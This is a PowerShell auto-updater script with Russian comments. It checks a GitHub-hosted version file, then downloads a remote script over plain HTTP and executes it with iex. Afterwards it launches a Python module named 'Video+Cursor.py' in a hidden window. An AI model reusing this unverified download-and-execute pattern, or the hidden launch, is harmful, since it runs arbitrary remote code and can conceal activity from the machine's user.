# Путь к файлу version.txt
$localVersionFile = "C:\ProgramData\Maks\version.txt"

# Путь к файлу Python-скрипту
$pythonScript = "C:\ProgramData\Maks\modules\Video+Cursor.py"

# Путь к pythonw.exe
$pythonPath = "C:\ProgramData\Maks\Python\python.exe"

# URL для получения последней версии
$remoteVersionUrl = "https://raw.githubusercontent.com/MGrinx5/maks/refs/heads/main/version.txt"

# Функция для сравнения версий
function Compare-Versions($version1, $version2) {
    $version1Parts = $version1.Split('.')
    $version2Parts = $version2.Split('.')
    
    for ($i = 0; $i -lt [Math]::Max($version1Parts.Length, $version2Parts.Length); $i++) {
        $v1 = if ($i -lt $version1Parts.Length) { [int]$version1Parts[$i] } else { 0 }
        $v2 = if ($i -lt $version2Parts.Length) { [int]$version2Parts[$i] } else { 0 }
        
        if ($v1 -lt $v2) {
            return -1  # $version1 < $version2
        } elseif ($v1 -gt $v2) {
            return 1  # $version1 > $version2
        }
    }
    
    return 0  # версии одинаковые
}

# Проверяем наличие необходимых файлов
if (-Not (Test-Path $localVersionFile)) {
    Write-Output "File $localVersionFile not found. Script terminated."
    exit 1
}

if (-Not (Test-Path $pythonPath)) {
    Write-Output "Python executable not found at $pythonPath. Script terminated."
    exit 1
}

if (-Not (Test-Path $pythonScript)) {
    Write-Output "Python script not found at $pythonScript. Script terminated."
    exit 1
}

# Читаем текущую локальную версию
$localVersion = Get-Content $localVersionFile -ErrorAction Stop

# Получаем удалённую версию
try {
    $remoteVersion = Invoke-RestMethod -Uri $remoteVersionUrl -ErrorAction Stop
} catch {
    Write-Output "Failed to get remote version: $($_.Exception.Message)"
    exit 1
}

# Сравниваем версии
if (Compare-Versions $localVersion $remoteVersion -ne 0) {
    Write-Output "Update required: local version $localVersion, latest version $remoteVersion."

    # Запускаем команду для обновления
    Write-Output "Downloading and running update script..."
    try {
        iex (New-Object Net.WebClient).DownloadString('http://raw.githubusercontent.com/MGrinx5/maks/refs/heads/main/DownloadString.txt')
        Write-Output "Update script executed successfully."

        # Обновляем локальный файл версии
        Write-Output "Updating local version file..."
        Set-Content -Path $localVersionFile -Value $remoteVersion -ErrorAction Stop
        Write-Output "Local version file updated to $remoteVersion."
    } catch {
        Write-Output "Failed to run update script: $($_.Exception.Message)"
        exit 1
    }
} else {
    Write-Output "The version is current. No update required."
}

# Запускаем Python-скрипт с использованием pythonw.exe в скрытом режиме
Write-Output "Running $pythonScript with $pythonPath..."
Start-Process -FilePath $pythonPath -ArgumentList $pythonScript -WindowStyle Hidden
